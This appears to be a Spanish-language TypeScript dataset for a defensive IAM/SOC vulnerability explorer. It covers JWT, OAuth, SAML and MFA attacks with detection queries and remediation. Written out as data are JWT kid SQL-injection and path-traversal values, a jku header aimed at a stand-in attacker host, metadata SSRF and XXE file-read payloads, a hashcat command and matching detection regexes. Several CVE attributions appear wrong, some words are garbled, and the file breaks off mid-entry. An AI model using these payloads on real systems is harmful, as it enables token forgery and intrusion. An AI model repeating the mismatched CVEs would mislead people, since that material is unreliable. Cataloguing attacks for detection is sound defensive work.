// vulnerabilities.ts
// Dataset offline para la herramienta "Vulnerabilidades IAM/SOC" de VaultNotes.
// 100% offline — este dataset alimenta VulnerabilityExplorerTool.tsx.
//
// Cobertura: JWT/OAuth/SAML, Active Directory (Kerberos, delegación, AD CS
// ESC1-ESC16, relay), Cloud IAM (AWS/Azure/GCP/K8s), Privilege Escalation,
// evasión SOC (AMSI/ETW/LOLBins), movimiento lateral y persistencia.
//
// IDs: <CATEGORÍA>-<NNN>. No usar `export default`.
// Las detecciones son ejemplos de partida: ajústalos a tu entorno
// (nombres de tablas, tenants, naming conventions).

export type VulnerabilityCategory =
  | 'IAM' | 'AD' | 'Auth' | 'Cloud_IAM' | 'SOC_Evasion'
  | 'PrivEsc' | 'LateralMovement' | 'Persistence';

export type VulnerabilitySeverity = 'Critical' | 'High' | 'Medium' | 'Low';

export interface VulnerabilityInfo {
  id: string;
  nombre: string;
  categoria: VulnerabilityCategory;
  severidad: VulnerabilitySeverity;
  cve_ejemplo?: string[];
  mitre_attack: string[];
  descripcion_tecnica: string;
  impacto_iam_soc: string;
  vector_ataque: string[];
  deteccion: { kql?: string; spl?: string; sigma?: string; win_event_ids?: number[] };
  mitigacion_hardening: string[];
  parcheo_remediacion: string[];
  referencias: string[];
}

export const VULNERABILITIES: VulnerabilityInfo[] = [
  /* ============================ AUTH / JWT / OAuth / SAML / MFA ============================ */
  {
    id: 'AUTH-001',
    nombre: 'JWT algoritmo "none"',
    categoria: 'Auth',
    severidad: 'Critical',
    mitre_attack: ['T1550.001'],
    descripcion_tecnica: 'El header de un JWT declara {"alg":"none"} y elimina la firma. Si el backend acepta tokens sin verificar que el algoritmo esté en una whitelist (o usa una librería antigua vulnerable), cualquiera puede fabricar un token válido con payload arbitrario (sub=admin, rol=administrator).',
    impacto_iam_soc: 'Suplantación total de identidad sin necesidad de credenciales. Para el SOC: un login "válido" desde el punto de vista de logs — solo se detecta si se audita el header alg recibido o el issuer.',
    vector_ataque: ['Forjar token con alg:none y claims de administrador', 'Enviar a endpoints que acepten el token sin validar alg', 'Variante: header alg mayúsculas/None/none variations'],
    deteccion: {
      kql: 'let hdr = dynamic(["{\"alg\":\"none\"", "{\"alg\":\"None\""]); AppHttpRequest | where RequestBody contains "alg" and RequestBody matches_regex "(?i)none" | take 10',
      spl: 'index=api sourcetype=http_request "alg" | regex _raw="(?i)\"alg\"\s*:\s*\"none\"" | stats count by src_ip, uri',
      sigma: 'jwt_alg_none_forbidden_token (custom)',
    },
    mitigacion_hardening: ['Whitelist explícita de algoritmos aceptados (RS256/ES256), nunca leer alg del token', 'Rechazar cualquier token sin firma o con alg=none/None en el edge', 'Migrar a librerías JWT actuales con verificación estricta'],
    parcheo_remediacion: ['Actualizar la librería JWT a última versión (pyjwt>=2, jose4j, jsonwebtoken>=9)', 'Invalidar y re-emitir todos los tokens de sesión tras el parche', 'Añadir test de regresión que envíe alg:none y espere 401'],
    referencias: ['https://portswigger.net/web-security/jwt/algorithm-confusion', 'CVE-2015-9235 (node-jsonwebtoken alg none)'],
  },
  {
    id: 'AUTH-002',
    nombre: 'JWT con secreto débil (brute-force HS256)',
    categoria: 'Auth',
    severidad: 'Critical',
    mitre_attack: ['T1110.001'],
    descripcion_tecnica: 'Si el JWT firma con HMAC (HS256) y el secreto es débil (palabra de diccionario, "secret", nombre de la empresa), un atacante extrae el token, lo rompe offline con hashcat/jwt-cracker (modo 16500) y firma tokens arbitrarios.',
    impacto_iam_soc: 'Escalada de privilegios total y persistencia silenciosa: el atacante emite tokens válidos a demanda. El SOC no ve nada anómalo hasta que alguien nota tokens con exp anómalos o payloads incoherentes.',
    vector_ataque: ['Capturar cualquier JWT de sesión (Burp, logs, referer)', 'Crackear el secreto offline con hashcat -m 16500', 'Firmar tokens con claims de admin'],
    deteccion: {
      kql: 'AppHttpRequest | where RequestBody contains "alg\":\"HS256" | take 10 // auditar longitud del secreto del emisor en revisión, no en runtime',
      sigma: 'jwt_hs256_usage_in_asymmetric_env (custom)',
    },
    mitigacion_hardening: ['Usar RS256/ES256 (asimétrico) en lugar de HS256 entre servicios', 'Si se usa HMAC: secreto de 256+ bits aleatorios desde KMS/vault', 'Rotar el secreto y revocar todos los tokens emitidos si se sospecha crack'],
    parcheo_remediacion: ['hashcat -m 16500 token.txt rockyou.txt — hazlo TÚ antes que el atacante', 'Migrar emisión a RS256 con kid y jwks rotativos', 'Añadir exp corto + refresh con rotación'],
    referencias: ['https://hashcat.net/wiki/doku.php?id=example_cracks', 'https://portswigger.net/web-security/jwt'],
  },
  {
    id: 'AUTH-003',
    nombre: 'JWT kid injection (SQLi / path traversal)',
    categoria: 'Auth',
    severidad: 'Critical',
    mitre_attack: ['T1190'],
    descripcion_tecnica: 'El header JWT incluye "kid" (key id) que el servidor usa para localizar la clave de verificación (p. ej. SELECT key FROM keys WHERE kid=\'$kid\' o file_get_contents(\'/keys/\'+kid)). Si no se sanitiza: inyección SQL para retornar una clave conocida, o path traversal (/dev/null, archivo controlado) para forzar una firma vacía/predecible.',
    impacto_iam_soc: 'Forja de tokens firmados "válidos". El SOC ve un flujo de autenticación normal — la intrusión vive en el parámetro kid, que rara vez se loguea.',
    vector_ataque: ['kid: x\' UNION SELECT \'secret\' -- (firma con secreto conocido)', 'kid: ../../dev/null (firma vacía)', 'kid apuntando a archivo subible por el atacante'],
    deteccion: {
      kql: 'AppHttpRequest | where RequestBody matches_regex @\'"kid"\\s*:\\s*"[^"]*(\\.\\./|UNION|SELECT|--)\' | summarize count by src_ip',
      spl: 'index=api "kid" | regex _raw="(?i)\"kid\"\s*:\s*\"[^\"]*(\\.\\./|union|select|--)" | stats count by src, uri',
      sigma: 'jwt_kid_injection_attempt (custom)',
    },
    mitigacion_hardening: ['Tratar kid como dato no confiable: whitelist de kids permitidos', 'Usar consultas parametrizadas y basename() en la resolución de path', 'Mejor aún: resolver la clave vía jwks por índice, no por string libre'],
    parcheo_remediacion: ['Parchear el endpoint de resolución de claves', 'Rotar todas las claves de firma y revocar tokens', 'Añadir logging del kid recibido (sanitizado) para forense'],
    referencias: ['https://portswigger.net/research/there-is-no-place-like-localhost', 'https://www.synacktiv.com/publications/jwt-security'],
  },
  {
    id: 'AUTH-004',
    nombre: 'JWT jku / x5u header SSRF (JWKS atacante)',
    categoria: 'Auth',
    severidad: 'Critical',
    mitre_attack: ['T1190'],
    descripcion_tecnica: 'Headers jwk/jku/x5u del JWT indican DÓNDE descargar la clave pública de verificación. Si el backend confía en esa URL, el atacante aloja su propio JWKS en su servidor, firma el token con su clave privada y apunta jku/x5u a ella: el servidor valida contra la clave del atacante → token "válido".',
    impacto_iam_soc: 'Suplantación de identidad arbitraria. Es además un vector SSRF confirmado: el backend hace peticiones salientes a URLs controladas (uso interno para pivotar a metadata/169.254.169.254).',
    vector_ataque: ['Generar par de claves y alojar JWKS en https://atacante/jwks.json', 'Firmar token con kid coincidente y jku apuntando al JWKS', 'Variante SSRF: jku=http://169.254.169.254/latest/meta-data/'],
    deteccion: {
      kql: 'let ext = dynamic(["jwk","jku","x5u"]); AppHttpRequest | where RequestBody contains "jku" or RequestBody contains "x5u" | take 20 // validar dominios de jwks contra whitelist',
      spl: 'index=api sourcetype=http_request ("jku" OR "x5u") | stats count by src_ip, uri | where src_ip != internal',
      sigma: 'jwt_jku_x5u_header_present (custom)',
    },
    mitigacion_hardening: ['Nunca resolver jku/x5u del token: la URL de JWKS es configuración del servidor', 'Whitelist estricta de dominios para JWKS si se permite', 'Bloquear egress del backend hacia dominios no aprobados'],
    parcheo_remediacion: ['Eliminar el soporte de jwk/jku/x5u del validador', 'Auditar logs salientes del backend hacia dominios raros (SSRF ya ocurrido)', 'Rotar claves y re-emitir tokens'],
    referencias: ['https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/', 'https://portswigger.net/web-security/jwt'],
  },
  {
    id: 'AUTH-005',
    nombre: 'JWT key confusion RS256→HS256',
    categoria: 'Auth',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2016-10555'],
    mitre_attack: ['T1550.001'],
    descripcion_tecnica: 'El atacante cambia el header alg de RS256 a HS256 y firma el token con la clave PÚBLICA del emisor (que conoce) como si fuera el secreto HMAC. Si el validador usa la misma clave para ambos algoritmos, la firma pasa la verificación.',
    impacto_iam_soc: 'Forja de tokens sin conocer ninguna clave privada. Frecuente en librerías que derivan la clave del header alg. Para el SOC: sesiones de admin apareciendo "legítimas".',
    vector_ataque: ['Obtener la clave pública (endpoint jwks o certificado TLS)', 'Re-signar el token con alg=HS256 usando esa clave pública como HMAC secret', 'Enviar el token modificado'],
    deteccion: {
      kql: 'AppHttpRequest | where RequestBody contains "HS256" and RequestBody contains "kid" | take 10 // alertar si el emisor es RS256-only por diseño',
      spl: 'index=api "HS256" | stats count by uri, src',
      sigma: 'jwt_algorithm_downgrade (custom)',
    },
    mitigacion_hardening: ['Hardcodear el algoritmo esperado por emisor (no confiar en alg del header)', 'Separar físicamente claves simétricas y asimétricas', 'Usar librerías con API que exige el algoritmo como parámetro del servidor'],
    parcheo_remediacion: ['Actualizar librería JWT (jsonwebtoken>=4.2.2/9, pyjwt>=2)', 'Rotar claves por si hubo abuso previo', 'Test de regresión con token HS256 firmado con la pública'],
    referencias: ['https://portswigger.net/blog/cracking-jwt-signatures', 'CVE-2016-10555'],
  },
  {
    id: 'AUTH-006',
    nombre: 'JWT sin validación de exp / claims críticos',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1550.001'],
    descripcion_tecnica: 'El backend decodifica el payload pero no valida exp/nbf/iat, o ignora iss/aud, o acepta claims de rol legacy ("admin":true) que la app ya no usa. Tokens robados caducados siguen funcionando; tokens de otro tenant/staging validan en prod.',
    impacto_iam_soc: 'Tokens robados con vida infinita = persistencia perfecta. Confusiones cross-entorno. El SOC no puede razonar sobre "sesión válida" porque la expiración es mentira.',
    vector_ataque: ['Replay de tokens viejos capturados (logs, repos, Burp history)', 'Token de ambiente staging reutilizado en producción (aud no validado)', 'Claims de rol legacy inyectados'],
    deteccion: {
      kql: 'SigninLogs | where ResultType == 0 and AdditionalDetails contains "token" | take 10 // auditar sesiones más largas que la política de exp máxima',
      spl: 'index=auth | eval age=now()-_time | stats max(age) by user | where max(age) > 86400',
    },
    mitigacion_hardening: ['Validar SIEMPRE exp, nbf, iat, iss y aud explícitamente', 'exp corto (5-15 min) + refresh token rotativo con detección de reuso', 'Rechazar claims desconocidos o legacy (allowlist de claims)'],
    parcheo_remediacion: ['Añadir las validaciones faltantes en el middleware de auth', 'Revocar todos los refresh tokens activos (kick global)', 'Añadir jti + denylist en caché para revocación inmediata'],
    referencias: ['https://datatracker.ietf.org/doc/html/rfc7519#section-4.1', 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html'],
  },
  {
    id: 'AUTH-007',
    nombre: 'OAuth authorization code interception',
    categoria: 'Auth',
    severidad: 'High',
    cve_ejemplo: ['CVE-2025-30065'],
    mitre_attack: ['T1550.001', 'T1185'],
    descripcion_tecnica: 'El atacante intercepta el authorization code durante el flujo (referrer leak, redirect_uri abierto, proxy malicioso, app maliciosa registrada como handler del custom scheme) y lo canjea antes que la víctima. Sin PKCE, el code viaja solo.',
    impacto_iam_soc: 'Account takeover con la sesión del atacante equivalente a la víctima. En proveedores cloud, el token resultante permite leer correo/OneDrive → robo de datos y pivote a password reset de otros servicios.',
    vector_ataque: ['Custom scheme inseguro en apps móviles (_intent hijacking_)', 'redirect_uri wildcard o open redirect en el IdP', 'Referer header que filtra el code a third-party assets'],
    deteccion: {
      kql: 'SigninLogs | where AppDisplayName != "" and ResultType == 0 | summarize dcount(IpAddress) by UserId, AppDisplayName | where dcount_IpAddress > 3',
      spl: 'index=oauth grant_type=authorization_code | stats dc(ip) by user | where dc(ip) > 2',
      win_event_ids: [4624],
    },
    mitigacion_hardening: ['PKCE (S256) obligatorio en todos los clientes, públicos y confidenciales', 'redirect_uri exact-match (sin wildcards ni prefijos)', 'Los tokens NUNCA en fragment/URL; referrer-policy: no-referrer en la app'],
    parcheo_remediacion: ['Habilitar exigencia de PKCE en el tenant/app registration', 'Rotar client secrets y re-registrar redirect URIs', 'Buscar canjes de code con IP/User-Agent distintos al inicio del flujo'],
    referencias: ['https://datatracker.ietf.org/doc/html/rfc7636', 'https://oauth.net/2.1/'],
  },
  {
    id: 'AUTH-008',
    nombre: 'OAuth consent phishing / illicit consent grant',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1528', 'T1562.008'],
    descripcion_tecnica: 'El atacante registra una app OAuth multi-tenant en el IdP (Entra ID, Google Workspace) con permisos jugosos (Mail.Read, Files.ReadWrite.All) y envía un phishing link al "consent". La víctima acepta; el atacante obtiene un refresh token LEGÍTIMO que usa via Graph API — sin necesidad de robar passwords y saltándose el MFA.',
    impacto_iam_soc: 'Persistencia a largo plazo invisible: el token de la app se renueva offline y las peticiones salen desde IPs de Microsoft/Google, no del atacante. Los logins de la víctima son normales. Detección solo vía OAuth grant audits.',
    vector_ataque: ['Registrar app multi-tenant con permisos high-impact', 'Phishing: "X quiere acceder a su cuenta" con tu app', 'Canjear el grant por refresh token de larga vida'],
    deteccion: {
      kql: 'AADAuditLogs (o Entra ID audit) | where OperationName == "Consent to application" | project TimeGenerated, TargetResources, InitiatedBy // revisar apps no aprobadas',
      spl: 'index=o365 Workload=AzureActiveDirectory Operation="Consent to application." | stats count by AppId, UserId',
    },
    mitigacion_hardening: ['Admin consent obligatorio para permisos high-impact (deshabilitar user consent o limitarlo a editores verificados)', 'Revisar y purgar grants regularmente: Get-AzureADUserOAuth2PermissionGrant', 'App governance / OAuth app policies que alerten sobre apps nuevas'],
    parcheo_remediacion: ['Revocar el grant: Revoke-AzureADUserAllRefreshToken + eliminar consent', 'Bloquear el AppId del atacante en todo el tenant', 'Restablecer sesión de la víctima y rotar credenciales relacionadas'],
    referencias: ['https://attack.mitre.org/techniques/T1528/', 'https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-illicit-consent-grants'],
  },
  {
    id: 'AUTH-009',
    nombre: 'OAuth redirect_uri weak validation',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1185'],
    descripcion_tecnica: 'El IdP acepta redirect_uri con matching laxo (prefijo, subdominio, path traversal tipo /callback/../evil, o case-insensitive). El atacante envía a la víctima un auth request con redirect_uri malicioso que PASA la validación y recibe el code/token directamente.',
    impacto_iam_soc: 'Robo de authorization codes o tokens (en flows que responden por fragment). Deriva en account takeover. El defecto vive en la app registration, no en el usuario — phishing "de primera calidad".',
    vector_ataque: ['redirect_uri=https://app.legitima.com/callback/../../evil.com', 'Subdominio takeover: redirect_uri a un subdominio caducado del dominio aprobado', 'Case/encoding tricks: %2F%2E%2E'],
    deteccion: {
      kql: 'Entra ID audit | where OperationName == "Sign-in activity" // correlacionar redirect_uri de grants contra lista exacta aprobada',
      spl: 'index=proxy uri_path contains "redirect_uri" | regex redirect_uri!="^https://app\\.legit\\.com/callback$" | stats count by src',
    },
    mitigacion_hardening: ['redirect_uri exact string match siempre', 'Auditar app registrations por redirect URIs con wildcard o inactivas', 'Monitorear subdominios (certificate transparency) para evitar takeover'],
    parcheo_remediacion: ['Eliminar URIs laxas de la app registration', 'Rotar secrets del cliente afectado', 'Buscar en logs auth requests con redirect_uri fuera de la lista canónica'],
    referencias: ['https://datatracker.ietf.org/doc/html/rfc6749#section-3.1.2', 'https://oauth.net/2.1/'],
  },
  {
    id: 'AUTH-010',
    nombre: 'OAuth implicit flow — token expuesto en URL fragment',
    categoria: 'Auth',
    severidad: 'Medium',
    mitre_attack: ['T1550.001'],
    descripcion_tecnica: 'El implicit grant (response_type=token) devuelve el access_token en el fragment de la URL. Queda en historial del navegador, en Referer hacia recursos third-party, en logs de proxies si viaja en query, y es visible para cualquier JS en la página.',
    impacto_iam_soc: 'Fuga pasiva de tokens de sesión. Un solo recurso embebido malicioso (analytics, CDN comprometido) basta para cosechar tokens de usuarios. Sin refresh-token rotation no hay forma de invalidar en masa.',
    vector_ataque: ['Revisar historial/referrer de la víctima', 'Inyectar un asset third-party en la SPA que lea location.hash', 'XSS de lectura en la SPA (el token está accesible a JS)'],
    deteccion: {
      kql: 'BrowserLogs | where Url contains "#access_token=" or Url contains "access_token=" | take 10',
      spl: 'index=proxy url="*access_token=*" | stats count by user, url_path',
    },
    mitigacion_hardening: ['Migrar a Authorization Code + PKCE (implicit está deprecado en OAuth 2.1)', 'Nunca guardar tokens en localStorage/sessionStorage — memoria + cookies HttpOnly donde aplique', 'referrer-policy: no-referrer + CSP estricta'],
    parcheo_remediacion: ['Re-registrar la app con response_type=code + PKCE', 'Acortar vida de tokens emitidos en implicit aún activos', 'Purgar tokens de historial/extensiones afectadas es inviable — rotar todo'],
    referencias: ['https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics', 'https://oauth.net/2.1/'],
  },
  {
    id: 'AUTH-011',
    nombre: 'OAuth sin state (CSRF en el flujo)',
    categoria: 'Auth',
    severidad: 'Medium',
    mitre_attack: ['T1185'],
    descripcion_tecnica: 'El parámetro state liga el auth request con el callback. Sin él (o sin verificación estricta), un atacante puede montar CSRF: iniciar sesión con SU cuenta en el navegador de la víctima (login CSRF) o enlazar la identidad del atacante a la cuenta de la víctima (session fixation de terceros).',
    impacto_iam_soc: 'La víctima trabaja "como" el atacante (datos envenenados) o el atacante se auto-liga a la cuenta víctima (persistencia vía linked identity). Sutil y infradetectado.',
    vector_ataque: ['Inyectar un auth/callback URL con code del atacante en la sesión víctima', 'Login CSRF: forzar a la víctima a autenticarse como el atacante'],
    deteccion: {
      spl: 'index=oauth callback | eval has_state=if(isnull(state),"no","yes") | stats count by has_state',
    },
    mitigacion_hardening: ['state aleatorio por-request almacenado en sesión/cookie SameSite y verificado en callback', 'SameSite=Lax/Strict en cookies de sesión', 'Re-verificar identidad post-bind (re-auth) para operaciones de linking'],
    parcheo_remediacion: ['Implementar generación+verificación de state', 'Invalidar linked identities sospechosas', 'Añadir tests CSRF al flujo OAuth'],
    referencias: ['https://datatracker.ietf.org/doc/html/rfc6749#section-10.12', 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html'],
  },
  {
    id: 'AUTH-012',
    nombre: 'OAuth PKCE ausente en clientes públicos',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1550.001'],
    descripcion_tecnica: 'Sin PKCE, el authorization code viaja por un canal que el cliente público (SPA, móvil) no puede proteger por completo (custom schemes, redirects). Cualquiera que intercepte el code puede canjearlo: el code es bearer material por sí solo en clientes sin secret.',
    impacto_iam_soc: 'Account takeover en apps móviles y SPAs. En tenants Microsoft/Google, el token robado habilita Graph API: lectura de correo, OneDrive, password reset de servicios terciarios.',
    vector_ataque: ['Interceptar el redirect con el code (app maliciosa registrada en el scheme, proxy TLS)', 'Canjear code → access+refresh token'],
    deteccion: {
      kql: 'Entra audit | where OperationName == "Sign-in logs" and AppId in (…) | summarize arg_max(TimeGenerated, IpAddress) by UserId // detectar canjes desde IPs que no iniciaron el flow',
      spl: 'index=oauth | transaction session_id | where src!=src_start | stats count by user',
    },
    mitigacion_hardening: ['PKCE obligatorio (S256) — rechazar requests sin code_challenge', 'Deshabilitar implicit y ROPC en el tenant', 'Token lifetime corto + Conditional Access por dispositivo compliant'],
    parcheo_remediacion: ['Actualizar el SDK del cliente a uno con PKCE nativo (MSAL 4+, AppAuth)', 'Forzar PKCE también en clientes confidenciales (defensa en profundidad)', 'Rotar refresh tokens activos'],
    referencias: ['https://datatracker.ietf.org/doc/html/rfc7636', 'https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-auth-code-flow'],
  },
  {
    id: 'AUTH-013',
    nombre: 'Refresh token theft / replay sin rotación',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1550.001', 'T1539'],
    descripcion_tecnica: 'Los refresh tokens son credenciales de larga vida. Si no rotan en cada uso (rotation con detección de reuso), un token robado (XSS, proxy, disco) da acceso semanas/meses. OAuth 2.1 exige rotation + revocación en cascada.',
    impacto_iam_soc: 'Persistencia del atacante pese a password reset y MFA re-enable: el refresh token ya emitido sigue refrescando. El SOC ve una sesión "activa" más del usuario desde otra IP.',
    vector_ataque: ['Extraer refresh token de storage/proxy/malware', 'Refrescar periódicamente para mantener acceso', 'Replay tras logout si no hay revocación de familia'],
    deteccion: {
      kql: 'SigninLogs | where ResultType == 0 | summarize dcount(IpAddress), dcount(DeviceId) by UserId | where dcount_IpAddress > 3',
      spl: 'index=auth grant_type=refresh_token | stats dc(ip) as ips by user | where ips > 2',
    },
    mitigacion_hardening: ['Refresh token rotation: cada canje emite uno nuevo e invalida el anterior; reuso detectado = revocar TODA la familia', 'Vida máxima (p. ej. 14 días) + absolute timeout', 'Bind a dispositivo (DPoP/DPoP-like, mTLS) donde sea viable'],
    parcheo_remediacion: ['Implementar rotation con token family + reuse detection', 'Revocar todas las sesiones del usuario comprometido', 'Migrar a cookies HttpOnly+Samesite o tokens bound (mTLS/DPoP)'],
    referencias: ['https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics', 'https://auth0.com/docs/secure/tokens/refresh-tokens'],
  },
  {
    id: 'AUTH-014',
    nombre: 'Golden SAML (forja de aserciones con ADFS)',
    categoria: 'Auth',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2021-26855'],
    mitre_attack: ['T1606.002', 'T1550.001'],
    descripcion_tecnica: 'El atacante roba el certificado de firma de tokens de ADFS (Export-ADFSCert con DA o DCSync del servicio) y forja aserciones SAML arbitrarias para cualquier usuario de cualquier SP que confíe en ese IdP. NOHUILLAGE: no importa si la password de la víctima cambia ni su MFA — la aserción es criptográficamente perfecta.',
    impacto_iam_soc: 'Acceso persistente a todos los SP del federation trust (O365, AWS, SaaS) como cualquier usuario incluidos admins. La detección es casi imposible desde el SP; hay que vigilar el IdP (export de cert, inicios de sesión de servicio ADFS anómalos).',
    vector_ataque: ['Comprometer ADFS (DA en el DC o el propio servidor ADFS)', 'Exportar Token-Signing cert + uso de herramientas tipo ADFSpoof/SharpSAML', 'Firmar aserciones con NameID del admin objetivo'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4624 and LogonProcessName == "Advapi " // servicio ADFS; auditar ADFS Admin Log 1000/500-599 y accesos a DKM containers',
      spl: 'index=adfs sourcetype=adfs:trace (EventID=501 OR EventID=1000) | stats count by user, src_ip',
      win_event_ids: [4624, 5145],
    },
    mitigacion_hardening: ['Proteger ADFS como Tier-0: WAF, EDR, admin restringido, MFA para el servicio', 'Monitorizar el container DKM de ADFS en AD (lecturas anómalas)', 'Rotar certificados de firma y revocar confianza si hay indicio'],
    parcheo_remediacion: ['Reset total: reemplazar cert ADFS + regenerar trust con cada SP', 'Rotar el DKM y las credenciales del servicio ADFS', 'Hunt: logins SAML con sesión iniciada sin 4776/4624 previo en el IdP'],
    referencias: ['https://attack.mitre.org/techniques/T1606/002/', 'https://www.fireeye.com/blog/threat-research/2017/07/attacks-leveraging-ad-fs.html'],
  },
  {
    id: 'AUTH-015',
    nombre: 'SAML signature wrapping (XSW)',
    categoria: 'Auth',
    severidad: 'Critical',
    mitre_attack: ['T1606.002'],
    descripcion_tecnica: 'Se manipula el XML de la aserción SAML para que el validador verifique la firma sobre un nodo Original (intacto) pero lea los claims de otro nodo duplicado/mutado (envuelto en Signature, Object, o como hijo). La firma "vale" pero los datos que la app usa son del atacante.',
    impacto_iam_soc: 'Escalada a cualquier identidad federada. Famoso caso: OneLogin (2017) y autosploit en librerías SAML (python3-saml CVE-2017-11427, OneLogin SDK). El SP ve una aserción válida — cero alertas.',
    vector_ataque: ['Capturar el AuthnResponse', 'Duplicar el elemento Assertion: uno firmado (original), otro con NameID=admin', 'Enviar por el binding POST/Artifact'],
    deteccion: {
      kql: 'AppHttpRequest | where RequestBody contains "<saml" and RequestBody contains "Assertion" // IDS: count de <Assertion por response > 1',
      spl: 'index=saml | eval n=mvcount(split(_raw,"<saml2?:Assertion")) | where n > 2',
    },
    mitigacion_hardening: ['Librería SAML actualizada + verificación estricta: validar firma del nodo EXACTO que se procesa (referencia URI unívoca)', 'Rechazar XML con comentarios/múltiples Assertions', 'Firmar el Response completo (envelope), no solo la Assertion'],
    parcheo_remediacion: ['Actualizar la librería SAML a la versión parcheada (python3-saml>=1.4.10, OneLogin SDK parcheado)', 'Rotar certificados de firma del IdP', 'Hunt en logs por aserciones con más de un nodo Assertion'],
    referencias: ['CVE-2017-11427', 'https://research.nccgroup.com/2015/06/05/on-the-security-of-single-sign-on-web-services/'],
  },
  {
    id: 'AUTH-016',
    nombre: 'SAML comment/XEE injection en aserciones',
    categoria: 'Auth',
    severidad: 'High',
    cve_ejemplo: ['CVE-2018-0489', 'CVE-2017-11427'],
    mitre_attack: ['T1606.002'],
    descripcion_tecnica: 'Los parsers XML permisivos permiten que un comentario dentro del NameID cambie el valor efectivo (ej. admin<!---->@evil vs admin@corp) — dos lecturas distintas del mismo nodo firmado: la firma cubre los bytes, el parser descomenta. Variante: entity expansion (XXE/billion laughs) para DoS del SP.',
    impacto_iam_soc: 'Authentication bypass federado (CVE-2018-0489 en OneLogin python-saml). El SP valida firma OK y procesa un NameID distinto al firmado.',
    vector_ataque: ['NameID con comment injection que signifique "admin" para el parser pero distinto para el verificador', 'XXE para leer archivos del SP (file:///etc/passwd en entity)'],
    deteccion: {
      spl: 'index=saml "<!--" | stats count by src',
    },
    mitigacion_hardening: ['Parsers XML con comentarios deshabilitados y entities off (defusedxml)', 'Hardening: reject comments en aserciones entrantes', 'Comparar el nodo firmado por referencia URI exacta'],
    parcheo_remediacion: ['Actualizar librería SAML a versión con fix', 'Purgar sesiones federadas activas', 'Test de regresión con aserción comentada'],
    referencias: ['CVE-2018-0489', 'https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html'],
  },
  {
    id: 'AUTH-017',
    nombre: 'MFA fatigue / push bombing',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1621', 'T1110'],
    descripcion_tecnica: 'Con la password ya robada (phishing/infostealer), el atacante lanza push MFA repetidos hasta que la víctima, molesta o por costumbre (prompt vending), acepta uno. Caso icónico: Uber 2022. Los "número de partido" (#MFA number matching) lo mitigan.',
    impacto_iam_soc: 'Aprobar un push = entregar la sesión. El SOC VEl: múltiples MFA requests en ventana corta para el mismo usuario — señal clarísima de credencial comprometida.',
    vector_ataque: ['Credenciales válidas + spam de push a las 3am', 'Vishing de acompañamiento ("soy de IT, aprueba")', 'Targeting a usuarios con prompt auto-accept'],
    deteccion: {
      kql: 'SigninLogs | where ResultType == 500121 or ResultDescription contains "MFA" | summarize cnt=count() by UserId, bin(TimeGenerated, 10m) | where cnt > 5',
      spl: 'index=auth action="mfa_prompt" | stats count by user | where count > 3 | sort - count',
      win_event_ids: [4625, 4624],
    },
    mitigacion_hardening: ['Number matching obligatorio (Microsoft Authenticator)', 'Rate-limit de pushes + bloqueo temporal tras N rechazos', 'MFA resistente a phishing (FIDO2/Passkeys, WHfB) para usuarios privilegiados'],
    parcheo_remediacion: ['Reset de password de la víctima + revocación de tokens', 'Auditar accesos de la cuenta en la ventana del ataque', 'Migrar a FIDO2 los tier-0/1'],
    referencias: ['https://attack.mitre.org/techniques/T1621/', 'https://learn.microsoft.com/en-us/entra/identity/authentication/how-to-mfa-number-match'],
  },
  {
    id: 'AUTH-018',
    nombre: 'SIM swap / MFA por SMS',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1110', 'T1621'],
    descripcion_tecnica: 'El atacante hace portabilidad del número de la víctima (social engineering al carrier o insider) y recibe los OTP SMS. El MFA por SMS es bearer débil: depende de la seguridad del carrier, no del IdP.',
    impacto_iam_soc: 'Account takeover completo con solo la password + SIM swap. El SOC ve logins "nuevo dispositivo" pero con OTP correcto. Historias reales: robo de cripto y takeover corporativo.',
    vector_ataque: ['Doxxing del número (LinkedIn, breaches)', 'Port-out SIM swap vía carrier', 'Intercepción SS7 en redes legacy'],
    deteccion: {
      kql: 'SigninLogs | where AuthenticationRequirement == "multiFactorAuthentication" and AuthenticationProtocol contains "sms" | summarize dcount(DeviceId) by UserId | take 20',
      spl: 'index=auth mfa_method=SMS | stats dc(device_id) by user',
    },
    mitigacion_hardening: ['Prohibir SMS/voz como segundo factor para todos — passkeys o TOTP hardware', 'Port freeze / PIN de portabilidad con el carrier (personal)', 'Number matching + geovelocity en autenticación'],
    parcheo_remediacion: ['Migrar cuentas críticas a FIDO2/Authenticator push con matching', 'Reset de session tokens tras el incidente', 'Notificar al carrier para revertir la portabilidad'],
    referencias: ['https://attack.mitre.org/techniques/T1110/', 'NIST SP 800-63B (SMS deprecated)'],
  },
  {
    id: 'AUTH-019',
    nombre: 'Password spraying (low-and-slow)',
    categoria: 'Auth',
    severidad: 'High',
    mitre_attack: ['T1110.003'],
    descripcion_tecnica: 'Una password común ("Winter2026!", "Company2026#") contra MILES de cuentas, con ritmo bajo para no disparar lockout ni alertas por-fuerza-bruta. Pega especialmente contra OWA, Autodiscover, VPN y Azure AD (legacy auth).',
    impacto_iam_soc: 'Una sola password correcta = acceso inicial. El spray es el vector #1 de acceso inicial en incidentes reales (hasta 2024, antes del infostealer boom). El SOC debe alertar por PATRÓN agregado, no por usuario.',
    vector_ataque: ['Lista de usuarios vía LinkedIn/OSINT (o Graph API si hay token previo)', 'Spray en fines de semana/festivos (horario SOC débil)', 'Legacy auth (SMTP AUTH, IMAP) que no registra rich signals'],
    deteccion: {
